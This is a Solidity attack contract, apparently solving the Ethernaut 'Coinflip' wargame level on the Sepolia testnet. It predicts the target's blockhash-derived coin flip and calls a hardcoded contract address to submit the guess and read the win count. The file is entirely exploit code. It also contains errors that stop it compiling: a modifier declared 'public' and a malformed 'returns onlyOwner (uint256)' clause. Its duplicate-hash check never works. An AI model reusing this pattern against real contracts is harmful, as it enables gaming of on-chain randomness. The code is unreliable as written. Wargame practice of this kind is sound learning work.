// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Attack contract for Coinflip level
 * @author DappScout
 * @notice deploy it on remix to the Sepolia testnet
 */
contract Storage {

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address immutable i_owner;
    address constant CONTRACT = 0xD1c4F7445d70484c8844eaf64dfc194850339e80;
    uint256 wins = 0;


    constructor(address _i_owner){

        i_owner = _i_owner;
    }

    modifier onlyOwner public{
        require(msg.sender == i_owner);
        _;
    }

    function flip() public view returns  (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 lastHash;

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == true) {
            return true;
        } else {
            return false;
        }
    }


    function returnBlock() public view returns(uint256)
        {
            return block.number;
        }


    ///@notice Funtion for automating the answer retriving and sending the call - manuall approach was too slow 
    function submit() public returns onlyOwner (uint256) {

    bool guess = flip();
    (bool success, bytes memory returnData) = CONTRACT.call{value: 0}(abi.encodeWithSelector(bytes4(keccak256("flip(bool)")), guess));

    (bool success2, bytes memory returnData2) = CONTRACT.call{value: 0}(abi.encodeWithSelector(bytes4(keccak256("consecutiveWins()"))));

    if (success2 && returnData2.length > 0){
        wins = abi.decode(returnData2, (uint256));
    }
    return wins;
    }


}